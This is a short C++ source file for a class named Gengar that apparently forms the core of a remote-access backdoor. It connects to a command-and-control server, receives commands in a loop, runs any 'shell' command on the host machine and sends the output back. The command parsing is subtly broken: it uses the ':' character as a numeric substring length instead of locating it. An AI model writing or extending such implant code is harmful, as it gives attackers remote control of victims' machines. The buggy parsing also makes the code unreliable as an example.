#include <string>
#include "gengar.h"

void Gengar::ListenForCommand()
{
	char type_content_delimiter = ':';

	while (true)
	{
		std::string input = m_client.Receive();
		std::string type = input.substr(0, type_content_delimiter);
		std::string content = input.substr(type_content_delimiter, input.size());
		RouteCommand(type, content);
	}
}

void Gengar::RouteCommand(std::string& type, std::string& content)
{
	std::string output;
	if (type == "shell")
	{
		output = m_machine.RunShellCommand(content);
	}
	m_client.Send(output);
}

void Gengar::ConnectToCnc()
{
	m_client.Connect();
}
